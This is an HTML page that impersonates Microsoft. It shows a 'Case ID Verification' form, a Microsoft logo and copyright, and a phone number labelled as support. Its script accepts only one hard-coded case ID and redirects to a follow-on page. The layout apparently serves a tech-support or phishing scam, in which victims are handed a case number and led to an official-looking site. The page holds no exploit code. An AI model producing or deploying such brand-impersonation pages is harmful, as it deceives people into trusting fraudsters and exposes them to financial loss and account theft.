<!DOCTYPE html>
<html>
<head>
  <title>Microsoft Case Verification</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f2f2f2;
      margin: 0;
      padding: 0;
    }
    .header, .footer {
      background-color: #ffffff;
      border-bottom: 1px solid #ccc;
      padding: 15px 30px;
      display: flex;
      align-items: center;
      justify-content: space-between;
    }
    .footer {
      border-top: 1px solid #ccc;
      border-bottom: none;
      font-size: 13px;
      color: #666;
      justify-content: center;
    }
    .logo {
      width: 140px;
    }
    .container {
      background-color: white;
      padding: 40px;
      border-radius: 10px;
      display: inline-block;
      box-shadow: 0 0 10px rgba(0,0,0,0.2);
      margin-top: 60px;
      text-align: center;
    }
    input, button {
      padding: 10px;
      font-size: 16px;
      width: 250px;
      margin: 10px 0;
    }
    .support {
      margin-top: 30px;
      font-size: 14px;
      color: #333;
    }
  </style>
</head>
<body>

  <div class="header">
    <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" class="logo" alt="Microsoft Logo">
    <span style="font-weight: 600; font-size: 18px;">Microsoft Case Verification</span>
  </div>

  <div style="text-align: center;">
    <div class="container">
      <h2>Case ID Verification</h2>
      <input type="text" id="caseId" placeholder="Enter Case ID">
      <br>
      <button onclick="verifyCase()">Continue</button>
      <div class="support">
        Support: +1 206 279 9715
      </div>
    </div>
  </div>

  <div class="footer">
    Â© 2025 Microsoft Corporation. All rights reserved.
  </div>

  <script>
    function verifyCase() {
      const caseId = document.getElementById("caseId").value.trim();
      if (caseId === "42986") {
        window.location.href = "case-42986.html";
      } else {
        alert("Invalid Case ID. Please try again.");
      }
    }
  </script>
</body>
</html>
